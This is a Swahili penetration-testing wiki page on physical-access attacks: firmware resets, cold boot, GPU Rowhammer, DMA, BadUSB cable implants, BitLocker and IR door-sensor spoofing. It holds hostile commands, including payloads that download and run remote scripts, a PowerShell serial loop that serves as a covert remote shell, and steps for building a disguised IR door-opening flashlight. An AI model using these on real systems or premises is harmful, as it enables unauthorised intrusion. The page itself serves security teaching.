# Mashambulizi ya Kimwili

{{#include ../banners/hacktricks-training.md}}

Kwa ajili ya kugundua interface katika kiwango cha board, serial consoles, ufikiaji wa flash, side channels na glitching, tumia [Hardware Hacking](hardware-hacking/README.md) na sura zake zinazohusu interfaces mahususi. Ukurasa huu unahusu mashambulizi yanayohitaji ufikiaji wa kimwili wa mfumo mzima.

## Kurejesha Nenosiri la BIOS na Usalama wa Mfumo

Mipangilio ya firmware ya PC za zamani inaweza kuwekwa upya kwa kukata betri ya CMOS au kutumia jumper ya clear-CMOS iliyoelekezwa kwenye nyaraka. Muda unaohitajika wa kuzima umeme hutegemea board, na nenosiri au funguo za kisasa za UEFI zinaweza kuhifadhiwa kwenye flash isiyopoteza data, embedded controller, au kifaa cha usalama, hivyo zikaendelea kuwepo hata baada ya betri kuondolewa. Angalia mwongozo wa board/huduma kabla ya kuunganisha pini kwa short; utaratibu huu pia unaweza kubatilisha vipimo vya TPM na kusababisha urejeshaji wa usimbaji wa diski.

Kwenye mifumo ya zamani ya x86, zana kama **killCMOS** na **CmosPwd** zinaweza kukagua au kubadilisha mipangilio inayohifadhiwa kwenye CMOS kutoka kwenye mazingira ya kuwasha. CmosPwd hutambua miundo ya nenosiri kutoka kwenye seti iliyoandikwa ya familia za zamani za BIOS na inaweza kuhifadhi nakala, kurejesha, au kufuta/kuua hali ya CMOS; matoleo yake yaliyochapishwa yanalenga mazingira ya zamani ya DOS/Windows, Linux, FreeBSD, na NetBSD.<sup>[[18]](#references)</sup> Zana hizi si programu za jumla za kuondoa nenosiri la UEFI na zinahitaji ufikiaji wa kutosha wa hardware/firmware.

Baadhi ya firmware za laptop huonyesha msimbo wa changamoto mahususi wa mtengenezaji baada ya majaribio kadhaa ya nenosiri kushindwa. Hifadhidata kama [bios-pw.org](https://bios-pw.org) zinaweza kupata nenosiri la urejeshaji la mtengenezaji wa zamani kwa baadhi ya modeli, lakini mifumo mingi huzuia majaribio bila kutoa changamoto inayoweza kutumika kupata nenosiri. Chukulia nenosiri lolote linalotengenezwa kuwa mahususi kwa modeli na epuka kumaliza idadi ya kudumu ya majaribio.

### Usalama wa UEFI

Kwa mifumo ya kisasa ya **UEFI**, CHIPSEC inaweza kukagua ulinzi wa vigezo vya Secure Boot. Anza na ukaguzi usiobadilisha chochote ulio hapa chini; hali ya hiari ya `-a modify` hujaribu kwa makusudi kuharibu vigezo na inapaswa kutumiwa tu kwenye mfumo wa majaribio unaoweza kurejeshwa. CHIPSEC yenyewe inaonya kuwa driver yake yenye mamlaka ya juu na ufikiaji wa hardware wa kiwango cha chini havifai kwa vifaa vya endpoint vinavyotumika kwenye uzalishaji.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Uchambuzi wa RAM na Mashambulizi ya Cold Boot

DRAM haipotezi kila biti mara moja refresh inaposimama. Kasi ya kuharibika kwa data hutofautiana sana kulingana na teknolojia ya moduli na halijoto; kupoza kunaweza kuhifadhi data muhimu kwa muda mrefu zaidi kuliko kukata na kurejesha umeme bila kupoza. Mashambulizi ya cold-boot huwasha upya haraka kwenye mazingira madogo ya kupata data au huhamisha moduli iliyopozwa, kunasa memory ghafi, na kurejesha funguo za kriptografia licha ya kuharibika kwa biti. Zana ya kunakili diski si lazima iwe zana ya kunasa physical memory, na Volatility huchanganua capture badala ya kuipata; tumia zana ya kupata data inayofaa jukwaa husika na iliyothibitishwa.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer Dhidi ya Page Tables

Mashambulizi ya kisasa ya GPU Rowhammer huwa na manufaa zaidi yakilenga **metadata ya GPU virtual memory** badala ya buffers za kawaida. Utafiti wa hivi karibuni kuhusu **GDDR6 NVIDIA Ampere GPUs** unaonyesha kuwa mshambulizi anayeendesha CUDA code bila upendeleo anaweza kutengeneza mifumo ya hammering mahususi kwa GPU, kutumia **memory massaging** kuweka miundo ya paging kwenye safu zilizo hatarini, na kisha kubadilisha biti kwenye **last-level page table** au **page directory** ya kati. Mara tu ingizo moja la tafsiri linapoharibika, mshambulizi anaweza kuanzisha **usomaji/uandikaji holela wa memory ya GPU**, kisha kuhamia kwenye udhibiti wa host.<sup>[[1]](#references)[[2]](#references)</sup>

### Muundo wa Unyonyaji

1. **Chunguza safu zinazoweza kuhammeriwa** kwenye GDDR6 na tengeneza mifumo ya hammering inayozingatia refresh/isiyo sawia ili kukwepa kinga za ndani ya DRAM.
2. **Fanya memory massaging ya mgao wa GPU** ili driver iweke miundo ya tafsiri ya page kwenye maeneo halisi yanayoweza kuhammeriwa badala ya kuiweka kwenye pool chaguomsingi iliyolindwa. Kwa vitendo, hii inaweza kumaanisha kumaliza eneo la low-memory page-table na kutawanya ramani kubwa sparse za UVM kwa strides zinazodhibitiwa.
3. **Badilisha metadata ya tafsiri** kama vile biti za **PFN** au zinazohusiana na aperture ndani ya ingizo la page-table/page-directory, ili ukurasa pepe unaodhibitiwa na mshambulizi uelekezwe kwenye kurasa za page-table, memory holela ya GPU, au ramani za mfumo zinazoonekana kwa host.
4. Tumia tena ramani ghushi kuandika upya maingizo mengine ya tafsiri na kuongeza uwezo hadi kufikia **usomaji/uandikaji holela wa memory ya GPU** katika GPU contexts mbalimbali.

### Kuhamia kwa Host na Hatua za Kupunguza Hatari

- **IOMMU ikiwa imezimwa**, ramani ghushi za system-aperture zinaweza kufichua **physical memory holela ya host** kwa GPU, na kugeuza uwezo wa GPU kuwa udhibiti kamili wa host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** hulenga maingizo ya last-level page-table, ilhali **GeForge** inaonyesha kuwa kuharibu kiwango cha page-directory kunaweza kuwa rahisi zaidi kwa sababu kubadilisha biti moja kunaweza kuelekeza upya sehemu kubwa ya mti wa tafsiri. Usichukulie kiwango kimoja tu cha paging kuwa muhimu kwa usalama.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bado ni muhimu kwa sababu huzuia njia ya moja kwa moja ya kufikia memory holela ya host inayotumiwa na GDDRHammer/GeForge, lakini **si kinga kamili**. **GPUBreach** inaonyesha njia ya pili ya kuhamia: mshambulizi huharibu buffers za CPU zinazoweza kuandikiwa na GPU na zinazomilikiwa na driver, kisha husababisha hitilafu za usalama wa memory kwenye NVIDIA driver ili kupata uwezo wa kuandika kwenye kernel na **root shell** hata IOMMU ikiwa imewashwa.<sup>[[3]](#references)</sup>
- **System-level ECC** ni hatua ya vitendo ya kuimarisha usalama kwenye GPU zinazotumika za workstation/server. GPU za watumiaji zisizo na ECC zina uso dhaifu zaidi wa ulinzi.<sup>[[4]](#references)</sup>
- Mashambulizi haya si ya kinadharia tu: **GeForge** iliripoti mabadiliko ya biti **1,171** kwenye RTX 3060 na **202** kwenye RTX A6000, yaliyotosha kujenga mnyororo unaofanya kazi wa kuongeza ruhusa za host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Mashambulizi ya Direct Memory Access (DMA)

Kwa urekebishaji wa UEFI IFR/NVRAM ukiwa nje ya mfumo unaoweza kushusha utekelezaji wa IOMMU kabla ya kuwasha na kuwezesha mnyororo wa DMA wa Windows, tazama:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** inaonyesha upatikanaji na urekebishaji wa memory kupitia **DMA** kwenye miingiliano kama FireWire na usanidi wa awali wa Thunderbolt, ikijumuisha saini za kihistoria za kukwepa kuingia. Si tu kwamba “haifanyi kazi dhidi ya Windows 10”: uwezekano wa kunyonywa hutegemea kiolesura, build lengwa, sera ya IOMMU, hali ya kufuli, na kama Windows Kernel DMA Protection inatumika na imewashwa. Windows 10 version 1803 na matoleo ya baadaye yalianzisha Kernel DMA Protection kwenye majukwaa yanayooana, na kubadilisha kwa kiasi kikubwa sehemu zinazoweza kushambuliwa.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB kwa Ufikiaji wa Mfumo

Kwenye volume ya Windows isiyosimbwa kwa njia fiche au ambayo tayari imefunguliwa, mazingira ya nje ya mfumo yanaweza kubadilisha binary za ufikivu kama **sethc.exe** au **Utilman.exe** na kuweka **cmd.exe**, na hivyo kutoa command prompt ya SYSTEM wakati njia ya mkato inayolingana kwenye skrini ya kuingia inapotumiwa. Zana kama **chntpw** zinaweza kuhariri data ya akaunti ya SAM ya ndani. Mbinu hizi hazikwepi volume ya BitLocker iliyofungwa na zinaweza kuharibu vitambulisho vinavyolindwa na DPAPI/EFS; hifadhi nakala za kiuchunguzi na backups.

**Kon-Boot** ni zana ya kibiashara ya kukwepa uthibitishaji wakati wa kuwasha kwa usanidi wa Windows/macOS unaotumika. Uoanifu hutegemea OS, hali ya firmware, Secure Boot, na usanidi wa usimbaji wa diski; haifungui volume ya BitLocker iliyofungwa.<sup>[[10]](#references)</sup>

---

## Kushughulikia Vipengele vya Usalama vya Windows

### Njia za Mkato za Kuwasha na Urejeshaji

- **Delete/Supr**, F2, F10, au kitufe kingine cha mtengenezaji kinaweza kufungua usanidi wa firmware.
- **F8** huingia kwenye chaguo za awali za Windows za kuwasha kwa hali ya juu kwenye usanidi ambapo njia hiyo bado imewezeshwa; njia ya sasa ya kuingia kwenye recovery hutofautiana.
- Kushikilia **Shift** kunaweza kuzuia Windows kuingia kiotomatiki kwenye baadhi ya usanidi, ingawa mipangilio ya sera/registry inaweza kuzima tabia hiyo.<sup>[[17]](#references)</sup>

### Vifaa vya BAD USB

Vifaa kama **USB Rubber Ducky** na bodi za Teensy vinaweza kujitambulisha kama kibodi za HID zinazoaminika na kuingiza mibofyo ya vitufe iliyofafanuliwa awali. Payload mwanzoni huwa na ruhusa na ufikiaji wa desktop wa kipindi kilichoingia; vidokezo vya UAC, kufungwa kwa skrini, mpangilio wa kibodi, muda wa utekelezaji, na sera ya USB ya endpoint bado huweka vikwazo.<sup>[[15]](#references)</sup>

Vifaa vya pembeni vinavyoweza kuratibiwa vinaweza pia kushambulia vichanganuzi vya kernel vya host na kuratibu vifaa kadhaa vya USB kwa heap grooming na ufichuaji wa taarifa:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Kwa mfano wa kichanganuzi cha Windows UAS mass-storage, tazama:

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

Ruhusa za msimamizi au za backup zinaweza kutumika kuunda shadow copy au kuhifadhi registry hives ili kupata faili zilizofungwa kama **SAM** na **SYSTEM**. Hii ni mbinu ya kukusanya data baada ya kuathiri mfumo, si ya kukwepa ruhusa, na inapaswa kulinganishwa na matukio ya `diskshadow`/VSS na uhamishaji wa registry hive.

## Mbinu za BadUSB / HID Implant

### Kifaa cha Android HID kinachochochewa na NFC

Simu ya Android yenye root inaweza kuwa kibodi ya USB inayoweza kuratibiwa tu ikiwa USB controller na kernel yake zina **USB gadget/HID support**. Kwenye vifaa vinavyooana, Kali NetHunter hutoa wasifu wa gadget kupitia **USB Arsenal**. Chaguo jingine ni [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), ambayo huunda kazi za ConfigFS gadget na inaweza kutoa vifaa vya character vya kibodi/panya kama `/dev/hidg0` na `/dev/hidg1`. Zana hiyo huunda tu endpoint ya gadget; mchakato tofauti lazima uandike HID reports humo. Ufikiaji wa root hauwezi kufidia kernel isiyo na ConfigFS, HID gadget support, au USB Device Controller inayoweza kutumika.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Endpoint hii inaweza kuunganishwa na Android NFC kama kichocheo cha kimwili. Programu ya [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) husoma UID ya tag, huibadilisha kuwa uwakilishi unaotarajiwa, hukagua whitelist ya ndani, na kutuma mfuatano wa vitufe uliosanidiwa wa mtindo wa Rubber Ducky baada ya kupata ulinganifu. Host iliyounganishwa huona ingizo la kawaida la kibodi na haihitaji programu ya NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Thibitisha utambuzi wa kifaa na mpangilio wa kibodi kwenye kihariri tupu cha maandishi kabla ya kutumia njia za mkato au amri. Payload isiyo na madhara ni:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Mipaka muhimu ya uaminifu:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **Orodha ya UID zinazoruhusiwa ni utambuzi, si uthibitishaji**. UID ni za umma, na baadhi ya aina za tokeni au emulator huruhusu kunakili au kujifanya kuwa tokeni nyingine. UID iliyoruhusiwa ikinakiliwa hupitia njia ileile ya usambazaji kama tokeni asilia.
- Moduli ya Magisk ya **NfcScreenOff** hurekebisha huduma ya NFC ili ifanye kazi kana kwamba skrini imewashwa na simu imefunguliwa. Ikiwa simu tayari imeunganishwa na host, mtu anaweza kuitumia kuanzisha payload bila kufungua simu.
- Nywila, tokeni za API, na amri zilizohifadhiwa kwenye payload ni siri zinazoweza kurejeshwa kwenye kifaa chenye root au bootloader iliyofunguliwa. Kuingiza nywila kupitia HID ni otomatiki ya kutumia tena nywila, si uthibitishaji usiohitaji nywila.
- Uingizaji wa HID hutumia ruhusa za desktop inayotumika na hutegemea kipengele kilichochaguliwa, muda, na mpangilio wa kibodi wa host. Hitaji uthibitisho wa hivi karibuni kutoka kwa mtumiaji kabla ya kusambaza vitendo nyeti, epuka kuweka siri zenye ruhusa kubwa kwenye scripts, na tumia kithibitishaji cha challenge-response cha kriptografia kwa uthibitishaji halisi.

### Vipandikizi vya kebo vinavyodhibitiwa kupitia Wi-Fi

- Vipandikizi vinavyotumia ESP32-S3 kama **Evil Crow Cable Wind** hufichwa ndani ya kebo za USB-A→USB-C au USB-C↔USB-C, hujitambulisha kama kibodi ya USB pekee, na hutoa stack yake ya C2 kupitia Wi-Fi. Mwendeshaji anahitaji tu kuwasha kebo kutoka kwa host ya mwathiriwa, kuunda hotspot yenye jina `Evil Crow Cable Wind` na nywila `123456789`, kisha kufungua [http://cable-wind.local/](http://cable-wind.local/) (au anwani yake ya DHCP) ili kufikia kiolesura cha HTTP kilichopachikwa.<sup>[[8]](#references)</sup>
- Kiolesura cha kivinjari kina vichupo vya *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, na *Config*. Payload zilizohifadhiwa huwekewa lebo kulingana na OS, mpangilio wa kibodi hubadilishwa papo hapo, na mifuatano ya VID/PID inaweza kubadilishwa ili kuiga vifaa vya pembeni vinavyojulikana.
- Kwa kuwa C2 imo ndani ya kebo, simu inaweza kuweka payload, kuanzisha utekelezaji, na kudhibiti vitambulisho vya Wi-Fi bila kutumia mtandao wa shirika—jambo linalofaa kwa uvamizi wa kimwili wa muda mfupi.

### Payload za AutoExec zinazotambua OS

- Kanuni za AutoExec huunganisha payload moja au zaidi ili zitekelezwe mara tu baada ya USB kujitambulisha. Kifaa pandikizi hutambua OS kwa njia nyepesi na kuchagua script inayolingana.
- Mfano wa mtiririko wa kazi:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) au `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Kwa kuwa utekelezaji hufanyika bila usimamizi, kubadilisha tu kebo ya kuchaji kunaweza kupata ufikiaji wa awali wa “plug-and-pwn” katika muktadha wa mtumiaji aliyeingia.

### Shell ya mbali kupitia Wi-Fi TCP iliyoanzishwa na HID

1. **Kuanzisha kupitia mibofyo ya vitufe:** Payload iliyohifadhiwa hufungua kiweko na kubandika kitanzi kinachotekeleza chochote kinachofika kwenye kifaa kipya cha USB serial. Toleo dogo la Windows ni:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant huweka channel ya USB CDC wazi huku ESP32-S3 yake ikizindua TCP client (Python script, Android APK, au desktop executable) inayounganisha tena na operator. Byte zozote zinazoandikwa kwenye TCP session hutumwa kwenye serial loop iliyo hapo juu, hivyo kuwezesha remote command execution hata kwenye hosts zilizotengwa na mtandao. Output ni finyu, kwa hiyo operators kwa kawaida huendesha amri bila kuona matokeo (kuunda akaunti, kuweka tooling ya ziada tayari, n.k.).

### Sehemu ya sasisho la HTTP OTA

- Kiolesura cha Evil Crow Cable Wind kilichoandikwa kwenye nyaraka kina endpoint ya kusasisha firmware isiyohitaji uthibitishaji katika `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Waendeshaji wa uga wanaweza kubadilisha vipengele vinavyotumika bila kuzima kifaa (kwa mfano, kusakinisha firmware ya USB Army Knife) katikati ya operesheni bila kufungua kebo, hivyo kuruhusu implant kubadili na kutumia uwezo mpya huku ikiwa bado imeunganishwa kwenye host lengwa.

## Kukwepa Usimbaji Fiche wa BitLocker

Upatikanaji wa kiuchunguzi ulioidhinishwa wa mfumo unaotumika au uliokuwa ukitumika hivi karibuni unaweza kuwa na ufunguo mkuu wa volume ya BitLocker au nyenzo nyingine zinazohusiana na ufunguo wakati volume imefunguliwa. Zana za kibiashara kama Elcomsoft Forensic Disk Decryptor na Passware Kit Forensic zinaweza kutafuta kwenye picha za kumbukumbu, faili za hibernation au crash dumps zinazotumika, lakini mafanikio hayajahakikishwa. Windows za kisasa pia husimba crash dumps kwa njia fiche BitLocker ikiwa imewezeshwa, na nenosiri la urejeshaji lenye tarakimu 48 lililohifadhiwa ni kifaa tofauti na ufunguo wa volume ulio kwenye kumbukumbu.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Uhandisi wa Kijamii wa Kuongeza Ufunguo wa Urejeshaji

Mshambuliaji anayemshawishi msimamizi kutekeleza amri za usimamizi wa BitLocker anaweza kuongeza recovery-password, external-key, au kinga nyingine, kisha akaikamata. Nenosiri la urejeshaji haliwezi kuwa mfuatano wowote wa sufuri: manenosiri ya urejeshaji ya nambari ya BitLocker yana muundo uliothibitishwa wa tarakimu 48. Sintaksia husika ya usimamizi ulioidhinishwa ni `manage-bde -protectors -add C: -recoverypassword`; orodhesha kinga zilizoongezwa kwa kutumia `manage-bde -protectors -get C:`. Fuatilia nyongeza za kinga na uhakikishe nyenzo mpya za urejeshaji zinahifadhiwa tu katika maeneo yaliyoidhinishwa.<sup>[[16]](#references)</sup>

---

## Kutumia Swichi za Kuingiliwa kwa Chassis / Matengenezo Kurejesha BIOS kwenye Mipangilio ya Kiwandani

Laptop nyingi za kisasa na kompyuta za mezani zenye umbo dogo zina **swichi ya kuingiliwa kwa chassis** ambayo hufuatiliwa na Embedded Controller (EC) pamoja na firmware ya BIOS/UEFI. Ingawa lengo kuu la swichi hii ni kutoa tahadhari kifaa kinapofunguliwa, wakati mwingine watengenezaji hutekeleza **njia ya mkato ya urejeshaji isiyoandikwa kwenye nyaraka** ambayo huwashwa swichi inapobadilishwa kwa mpangilio maalum.<sup>[[5]](#references)[[6]](#references)</sup>

### Jinsi Shambulizi Linavyofanya Kazi

1. Swichi imeunganishwa kwenye **GPIO interrupt** ya EC.
2. Firmware inayoendeshwa kwenye EC hufuatilia **muda na idadi ya mibofyo**.
3. Muundo maalum uliowekwa kwenye firmware unapotambuliwa, EC huendesha utaratibu wa *mainboard-reset* unaofuta **maudhui ya NVRAM/CMOS ya mfumo**.
4. Wakati wa kuwasha mfumo tena, modeli zilizoathiriwa hupakia hali ya firmware iliyorejeshwa. Kulingana na mtengenezaji na toleo, hali iliyofutwa inaweza kujumuisha nenosiri la msimamizi, mipangilio maalum ya kuwasha, au funguo za Secure Boot zilizosajiliwa; hali ya TPM na athari kwa usimbaji fiche wa diski lazima zitathminiwe kando.

> Kurejesha firmware kunaweza kuwezesha tena chaguo za kuwasha kutoka kwenye vifaa vya nje, lakini **hakufuti usimbaji fiche wa hifadhi**. BitLocker au mfumo mwingine wa usimbaji fiche wa diski nzima unaweza kuingia katika hali ya urejeshaji baada ya mabadiliko ya TPM/firmware na bado kuilinda diski ya ndani bila ufunguo wa urejeshaji.<sup>[[16]](#references)</sup>

### Mfano Halisi – Laptop ya Framework 13

Njia ya mkato ya urejeshaji kwa Framework 13 (kizazi cha 11/12/13) ni:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Baada ya mzunguko wa kumi, EC huweka alama inayoelekeza BIOS kufuta NVRAM wakati wa kuwasha upya kunakofuata. Utaratibu mzima huchukua takriban sekunde 40 na hauhitaji **chochote isipokuwa bisibisi**.<sup>[[5]](#references)</sup>

### Utaratibu wa Jumla wa Exploitation

1. Washa kifaa au kiamshe kutoka hali ya kusimamishwa ili EC iwe inafanya kazi.
2. Ondoa kifuniko cha chini ili kufikia swichi ya intrusion/maintenance.
3. Rudia mfuatano wa kuwasha na kuzima swichi unaotegemea mtengenezaji (rejelea nyaraka au mijadala, au fanya reverse-engineer ya firmware ya EC).
4. Kikusanye tena na ukiwashe upya, kisha kagua mipangilio ipi ya firmware na vitambulisho vimebadilika.
5. Ikiwa umeidhinishwa na kuwasha kutoka kifaa cha nje kunawezekana, washa kifaa kutoka kwenye live image inayodhibitiwa. Mara tu volume ya ndani inapofunguliwa kihalali (au ikiwa haikuwahi kusimbwa kwa njia fiche), mazingira ya live yanaweza kupata vitambulisho na data au kukagua EFI System Partition. Kurekebisha partition hiyo ili kusakinisha EFI implant hudumu na ni uvamizi mkubwa, na bado kunazuiliwa na Secure Boot, measured boot, ulinzi wa uandishi wa firmware na ufuatiliaji wa endpoint. Hifadhi iliyosimbwa kwa njia fiche hubaki bila kufikika bila ufunguo wake au nyenzo za kurejesha.

### Utambuzi na Upunguzaji wa Hatari

* Rekodi matukio ya chassis-intrusion kwenye dashibodi ya usimamizi wa OS na uyalinganishe na uwekaji upya wa BIOS usiotarajiwa.
* Tumia **mihuri inayoonyesha dalili za kuchezewa** kwenye skrubu/vifuniko ili kutambua kufunguliwa.
* Hifadhi vifaa katika **maeneo yanayodhibitiwa kimwili**; chukulia kuwa ufikiaji wa kimwili unamaanisha kifaa kimeathirika kikamilifu.
* Ikiwezekana, zima kipengele cha mtengenezaji cha “maintenance switch reset” au hitaji idhini ya ziada ya kriptografia ili kuweka upya NVRAM.

---

## Uingizaji Fiche wa IR Dhidi ya Sensor za Kutoka Bila Kugusa

### Sifa za Sensor

- Sensor za kawaida za “wave-to-exit” huunganisha kisambaza mwanga cha near-IR LED na moduli ya kipokezi inayofanana na ya rimoti ya TV, ambayo hutoa logic high tu baada ya kupokea mipigo kadhaa (~4–10) ya carrier sahihi (≈30 kHz).<sup>[[7]](#references)</sup>
- Kifuniko cha plastiki huzuia kisambaza na kipokezi kuelekeana moja kwa moja, hivyo kidhibiti hudhani kuwa carrier yoyote iliyothibitishwa imetokana na mwangaza uliorudishwa kutoka karibu, kisha huendesha relay inayofungua kufuli la mlango.
- Kidhibiti kinapoamini kuwa kuna kitu lengwa, mara nyingi hubadilisha muundo wa modulation ya mawimbi yanayotumwa, lakini kipokezi huendelea kukubali burst yoyote inayolingana na carrier iliyochujwa.

### Mchakato wa Shambulizi

1. **Nasa wasifu wa utoaji wa mawimbi** – unganisha logic analyser kwenye pini za kidhibiti ili kurekodi mawimbi ya kabla na baada ya utambuzi yanayoendesha IR LED ya ndani.
2. **Rudia tu mawimbi ya “baada ya utambuzi”** – ondoa/puuza kisambaza cha kawaida na uendeshe IR LED ya nje kwa kutumia muundo ambao kwa kawaida huanza baada ya kichocheo cha utambuzi. Kwa kuwa kipokezi hujali tu idadi/marudio ya mipigo, huchukulia carrier bandia kuwa mwangaza halisi uliorudishwa na kuwasha relay line.
3. **Dhibiti muda wa utumaji** – tuma carrier katika burst zilizorekebishwa (kwa mfano, washa kwa makumi ya millisekunde kisha izime kwa muda unaokaribiana) ili kutoa idadi ya chini kabisa ya mipigo bila kuzidisha AGC ya kipokezi au mantiki yake ya kushughulikia mwingiliano. Utoaji endelevu huifanya sensor ipoteze unyeti haraka na relay huacha kuwashwa.

### Uingizaji wa Mawimbi Yaliyorudishwa kutoka Umbali Mrefu

- Kubadilisha LED ya benchi na IR diode yenye nguvu kubwa, MOSFET driver na optics za kulenga huwezesha kichocheo cha kuaminika kutoka umbali wa takriban mita 6.
- Mshambulizi hahitaji kuona moja kwa moja tundu la kipokezi; kulenga boriti kwenye kuta za ndani, rafu au fremu za milango zinazoonekana kupitia kioo huruhusu nishati iliyorudishwa kuingia kwenye eneo la mwonekano la takriban 30° na kuiga mkono unaopunga karibu.
- Kwa kuwa vipokezi hutarajia mwangaza dhaifu uliorudishwa, boriti ya nje yenye nguvu zaidi inaweza kuruka kwenye nyuso kadhaa na bado ikabaki juu ya kizingiti cha utambuzi.

### Tochi ya Shambulizi Iliyowekewa Silaha

- Kuficha driver ndani ya tochi ya kawaida ya dukani hufanya kifaa kisionekane cha kutiliwa shaka. Badilisha LED inayoonekana na IR LED yenye nguvu kubwa inayolingana na bendi ya kipokezi, ongeza ATtiny412 (au kifaa sawia) ili kuzalisha burst za takriban 30 kHz, na utumie MOSFET kupitisha mkondo wa LED.
- Lenzi ya zoom ya darubini hukaza boriti ili kuongeza umbali/usahihi, huku motor ya mtetemo inayodhibitiwa na MCU ikitoa uthibitisho wa mguso kuwa modulation inafanya kazi bila kutoa mwanga unaoonekana.
- Kubadilishana kati ya mifumo kadhaa ya modulation iliyohifadhiwa (marudio tofauti kidogo ya carrier na miundo ya mawimbi) huongeza ulinganifu na familia za sensor zilizobadilishwa chapa, na kumwezesha mwendeshaji kuelekeza boriti kwenye nyuso zinazorudisha mwanga hadi relay isikike ikibofya na mlango kufunguka.

---

## References

- [1] [GDDRHammer: Kutatiza Sana Safu za DRAM — Mashambulizi ya Rowhammer kati ya Vipengele kutoka GPU za Kisasa](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Kutumia Hammering kwenye Kumbukumbu ya GDDR ili Kutengeneza Jedwali za Kurasa za GPU kwa Burudani na Faida](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Mashambulizi ya Kuongeza Haki kwenye GPU kwa Kutumia Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Notisi ya Usalama: Rowhammer - Julai 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Bonyeza hapa ili kupata pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mwongozo wa Kuweka Upya Mainboard](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Hapanaaaaaa, Gusa! – Kukwepa Sensor za IR za Kutoka Bila Kugusa kwa Tochi Fiche ya IR”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Chomeka, Cheza, Pata Pwn: Hacking kwa Kutumia Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Shambulizi la Rowhammer dhidi ya Chipu za NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Nyaraka rasmi za Kon-Boot na maelezo ya ulinganifu](https://kon-boot.com/)
- [11] [Nyaraka za CHIPSEC - Ulinzi wa vigezo vya Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Tusisahau: Mashambulizi ya Cold Boot dhidi ya Funguo za Usimbaji Fiche](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - Udanganyifu wa kumbukumbu halisi kupitia DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Ulinzi wa Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Nyaraka za Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Mwongozo wa utendaji wa BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Tabia ya kushikilia Shift na kuingia kiotomatiki](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Nyaraka na vipakuliwa vya CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Nyaraka za Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Nyaraka za Linux kernel - Kiendeshi cha USB HID gadget](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [Zana ya USB Gadget](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Geuza Simu ya Android Yenye Root Kuwa Kithibitishaji cha NFC na Zana ya Uendeshaji wa Kiotomatiki kwa Kompyuta Yako](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
